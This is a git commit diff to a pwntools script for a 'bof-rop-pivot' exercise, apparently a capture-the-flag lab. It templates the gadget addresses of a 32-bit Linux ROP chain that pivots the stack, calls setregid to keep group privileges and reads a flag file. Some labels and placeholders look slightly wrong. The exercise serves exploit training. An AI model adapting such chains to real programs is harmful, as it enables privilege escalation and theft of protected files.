a5e7ede03fd67513d90864d7ff9c159e04f9489f
sage <jjhcat0402@gmail.com>
2026-02-09 23:15:32 +0900

    Update and rename exploit.py to payload.py

--- bof-rop-pivot/payload.py
+++ bof-rop-pivot/payload.py
@@ -12,18 +12,17 @@ context.os = "linux"
 # =================================================
 
 # 필요한 값 세팅
-OFFSET     = 0x48
-STAGE      = 0x0804c040
-READ_PLT   = 0x08049040
-LEAVE_RET  = 0x080491f2
-DO_SETREGID= 0x080491ce
-POP_EAX    = 0x080491a3
-POP_EBX    = 0x080491a5
-POP_ECX    = 0x080491a7
-POP_EDX    = 0x080491a9
-MOV_EBX_EAX= 0x080491ab
-MOV_ECX_EAX= 0x080491ae
-SYSCALL    = 0x08049190
+OFFSET     = {bof_offset}
+STAGE      = {stage_addr}
+READ_PLT   = {read@plt}
+LEAVE_RET  = {leave_ret}
+POP_EAX    = {pop_eax}
+POP_EBX    = {pop_ebx}
+POP_ECX    = {pop_ecx}
+POP_EDX    = {pop_edx}
+MOV_EBX_EAX= {mov_ebx_eax}
+MOV_ECX_EAX= {mov_ecx_cax}
+SYSCALL    = {int_0x80}
 
 
 # =================================================
@@ -51,12 +50,12 @@ BUF  = STAGE + BUF_OFF
 stage2 = p32(0xdeadbeef)      # fake_ebp
 
 # --------------- (1) setregid ------------------
-stage2 += p32(POP_EAX) + p32(50)  # getgid
+stage2 += p32(POP_EAX) + p32(50)  # getegid
 stage2 += p32(SYSCALL)            # eax에 gid 저장됨
 
 stage2 += p32(MOV_EBX_EAX)
 stage2 += p32(MOV_ECX_EAX)
-stage2 += p32(POP_EAX) + p32(46)  # setregid
+stage2 += p32(POP_EAX) + p32(71)  # setregid
 stage2 += p32(SYSCALL)
 
 # ---------------- (2) ORW ----------------------
@@ -67,9 +66,8 @@ stage2 += p32(POP_EBX) + p32(FLAG)
 stage2 += p32(POP_ECX) + p32(0)
 stage2 += p32(POP_EDX) + p32(0)
 stage2 += p32(SYSCALL)
-
-# read(fd, BUF, 0x40)
 stage2 += p32(MOV_EBX_EAX)
+# read(fd, BUF, 0x40)
 stage2 += p32(POP_EAX) + p32(3)
 stage2 += p32(POP_ECX) + p32(BUF)
 stage2 += p32(POP_EDX) + p32(0x40)
@@ -84,7 +82,6 @@ stage2 += p32(SYSCALL)
 
 stage2 = stage2.ljust(FLAG_OFF, b"\x00") # flag 문자열 위치 맞추기
 stage2 += b"/tmp/bof-rop-pivot/flag\x00"
-
 
 # =================================================
 # 출력
